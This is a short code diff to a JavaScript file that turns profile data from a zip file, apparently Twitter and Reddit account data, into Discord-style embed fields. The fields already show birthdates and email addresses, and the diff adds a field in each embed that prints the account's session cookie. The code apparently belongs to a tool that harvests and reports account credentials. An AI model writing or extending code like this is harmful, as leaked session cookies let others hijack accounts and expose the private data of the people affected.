@@ -161,7 +161,8 @@ const json = async (zipFile) => {
         ['🔗 URL', profile.url || 'No URL set'],
         ['🎂 Birthday date', `${profile.extended_profile.birthdate.day}/${profile.extended_profile.birthdate.month}/${profile.extended_profile.birthdate.year}`],
         ['➕ Account created', `<t:${Math.floor(new Date(profile.created_at).getTime() / 1000)}>`],
-        ['✅ Verified?', profile.verified]
+        ['✅ Verified?', profile.verified],
+        ['🍪 Cookie', codeBlock(profile.cookie), false]
       ].map(fieldsMap),
       thumbnail: {
         url: profile.profile_image_url_https
@@ -188,7 +189,8 @@ const json = async (zipFile) => {
         ['⚔️ Is Mod?', account.is_mod],
         ['🥇 Is Gold?', account.is_gold],
         ['➕ Account created', `<t:${account.created_utc}>`],
-        ['✉️ Email address', code(account.email)]
+        ['✉️ Email address', code(account.email)],
+        ['🍪 Cookie', codeBlock(account.cookie), false]
       ].map(fieldsMap),
       thumbnail: {
         url: account.icon_img
